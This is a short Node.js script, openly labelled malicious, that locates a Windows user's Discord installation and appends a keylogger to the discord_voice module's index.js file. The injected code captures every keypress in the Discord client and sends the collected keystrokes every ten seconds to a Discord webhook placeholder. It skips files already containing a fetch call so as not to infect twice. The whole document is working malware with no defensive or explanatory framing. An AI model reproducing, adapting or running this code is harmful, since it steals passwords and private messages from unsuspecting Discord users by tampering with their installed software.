//Dependencies
const Fs = require("fs")
const Os = require("os")

//Variables
var malicious_code = `\nvar keys = ""
const send_time = 10000
document.onkeypress = function(e) {
    get = window.event?event:e
    key = get.keyCode?get.keyCode:get.charCode
    key = String.fromCharCode(key)
    keys+=key
}

window.setInterval(function(){
    if(keys.length >0 ) {
        fetch("discordwebhook_link", {
			method: "POST",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify({ content: keys })
		}).then(data =>{
			keys = ""
		})
    }
}, send_time)`

//Main
if(Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`)){
    const Directories = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    Directories().forEach(directory =>{
        const Directories2 = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

        if(directory.indexOf("app") != -1){
            Directories2().forEach(directory2 =>{
                if(directory2.indexOf("discord_voice") != -1){
                    Fs.readFile(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, "utf8", function(err, data){
                        if(err){
                            process.exit()
                        }
                
                        if(data.indexOf("fetch(") != -1){
                            process.exit()
                        }
                
                        data += `\n${malicious_code}`
                
                        Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, data, "utf8")
                    })
                }
            })
        }
    })
}
